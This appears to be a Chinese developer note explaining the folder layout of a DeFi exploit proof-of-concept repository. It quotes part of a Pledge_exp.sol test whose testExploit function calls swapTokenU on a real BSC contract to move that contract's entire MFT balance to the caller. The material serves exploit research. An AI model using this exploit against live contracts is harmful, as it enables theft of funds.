在src/test目录下，针对每个poc.sol,创建了一个名为poc的文件夹，该文件夹下存储了一些合约代码，具体内容如下:

比如src/test/2024-12/Pledge_exp.sol就会生成一个名为Pledge_exp的文件夹，文件夹中又存在xxx.sol的文件，这里的xxx名称来自Pledge_exp.sol中的变量。比如Pledge_exp.sol存在如下定义，同时合约的调用一般都是address::method这种形式。个人觉得直接用合约地址命名文件不好区分，因此直接用存储着合约地址的变量命名，其他的poc.sol也是如此，因此src/test/2024-12/Pledge_exp目录下存在pledge.sol,MFT.sol,BUSD.sol三个文件

这样做有如下目的，比如我想查找swapTokenU这个函数的具体代码，就可以到pledge.sol中找到，因为swapTokeU函数的调用是通过IPledge(pledge).swapTokenU(amount, _target);这种方式
```solidity
address internal constant pledge = 0x061944c0f3c2d7DABafB50813Efb05c4e0c952e1;
address internal constant MFT = 0x4E5A19335017D69C986065B21e9dfE7965f84413;
//BUSD 是 Binance 发行的稳定币，通常用于交易、流动性池等场景。
address internal constant BUSD = 0x55d398326f99059fF775485246999027B3197955;


function testExploit() public balanceLog {
    uint256 amount = IERC20(MFT).balanceOf(pledge);
    address _target = address(this);
    IPledge(pledge).swapTokenU(amount, _target);
}
```